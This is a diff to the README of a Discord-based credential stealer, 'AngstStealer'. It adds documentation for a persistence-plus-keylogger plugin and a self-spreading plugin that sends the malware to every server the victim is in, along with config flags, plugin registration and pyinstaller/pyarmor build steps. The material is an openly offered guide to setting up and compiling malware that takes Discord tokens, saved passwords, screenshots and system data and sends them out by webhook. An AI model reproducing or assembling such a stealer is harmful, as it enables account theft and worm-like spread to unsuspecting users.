@@ -10,6 +10,10 @@ AngstStealer is a POC malware which is designed to highlight and utilize Discord
 | Send | Zips and sends all the files through the Discord webhook. |
 | User | Drops userdata about the victim such as IP, Username and Computername. |
 | Windows | Also drops the windows activation key for the victims computer. |
+|UnOfficial |Description |
+|------ |----------- |
+| Post Exploitation | Persistance + keylogger, file dropper included. Author: <a href="https://github.com/TheDebianGuy">TheDebianGuy</a> |
+| Discord Spreader | Sends itself in all servers the user is in. Author: <a href="https://github.com/TheDebianGuy">TheDebianGuy</a> Idea: char#9249 |
 
 ### Setup
 1. Install python [here](https://www.python.org/ftp/python/3.7.7/python-3.7.7-amd64.exe)
@@ -26,7 +30,9 @@ CONFIG = {
         "filezilla": True,
         "discord": True,
         "screenshot": True,
-        "windows": True
+        "windows": True,
+	"postexploit": True,
+	"discordspread": True
     }
 }
 
@@ -38,6 +44,8 @@ filezilla -> Should it include possible saved filezilla passwords</br>
 windows -> Give information about your victim & includes the windows key</br>
 discord -> Steal discord tokens</br>
 screenshot -> takes a screenshot</br>
+postexploit -> persistance with keylogger</br>
+discordspread -> sends itself in all servers user is in</br>
 </br>
 6. Run one of the following commands listed below, it is worth noting that pyarmor will sometimes corrupt the executable so if you plan on using the pyarmor command you should test it locally to make sure it works.</br>
 `PYINSTALLER: pyinstaller --onefile --hidden-import=pkg_resources.py2_warn angst.py`</br>
@@ -80,7 +88,9 @@ change your import name on whatever you named your file and whatever you called 
         "filezilla": True,
         "discord": True,
         "screenshot": True,
-        "windows": True
+        "windows": True,
+	"postexploit": True,
+	"discordspread": True
     }
 ```
 ```
@@ -90,7 +100,8 @@ self.plugins = {
             "filezilla": Filezilla(),
             "discord": Discord(),
             "screenshot": Screenshot(),
-            "windows": Windows()
+            "windows": Windows(),
+	    "postexploit": PostExploit()
         }
 ```
 Make sure you use the exact same name when you put it under the config and self.plugins since it is case sensitive.
